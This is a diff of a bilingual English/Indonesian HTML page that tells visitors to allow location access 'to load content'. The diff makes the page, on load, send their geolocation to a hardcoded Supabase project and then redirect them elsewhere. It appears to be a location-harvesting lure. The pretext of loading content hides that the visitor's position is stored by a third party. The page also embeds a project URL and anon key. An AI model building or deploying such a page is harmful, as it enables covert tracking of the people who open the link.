@@ -83,17 +83,18 @@
     </div>
     <h1>Izinkan lokasi untuk memuat konten</h1>
     <p>
-      Click allow on location permission to continue
-      klik izin kan pada perizinan lokasi untuk melanjutkan 
+      Click allow on location permission to continue.<br />
+      Klik izinkan pada perizinan lokasi untuk melanjutkan.
     </p>
     <p class="hint">
-      Click allow on location permission to continue
-      klik izin kan pada perizinan lokasi untuk melanjutkan 
+      Click allow on location permission to continue.<br />
+      Klik izinkan pada perizinan lokasi untuk melanjutkan.
     </p>
 
     <div id="status" class="status">Waiting...</div>
   </div>
 
+  <!-- Supabase JS via CDN -->
   <script src="https://unpkg.com/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
   <script>
     const statusEl = document.getElementById("status");
@@ -103,8 +104,10 @@
       statusEl.scrollTop = statusEl.scrollHeight;
     }
 
+    // ====== GANTI DUA BARIS INI DENGAN PUNYAMU ======
     const SUPABASE_URL = "https://yfwnfaocsswqerhgxkto.supabase.co";
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd25mYW9jc3N3cWVyaGd4a3RvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjE3MTksImV4cCI6MjA4MDgzNzcxOX0.8ADF4wgcEv_lI2qOPcDt1OujckrIBoDYE52wIE8YZEM";
+    // =================================================
 
     const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
@@ -144,7 +147,6 @@
             log(JSON.stringify(data, null, 2));
 
             log("Mengalihkan ke halaman tujuan...");
-            // beri delay dikit biar log sempat kelihatan (optional)
             setTimeout(() => {
               window.location.href = REDIRECT_URL;
             }, 800);
@@ -163,4 +165,9 @@
 
     // otomatis jalan ketika halaman dibuka
     window.addEventListener("DOMContentLoaded", () => {
-      stat
+      statusEl.textContent = "Inisialisasi geolocation...";
+      sendLocation();
+    });
+  </script>
+</body>
+</html>
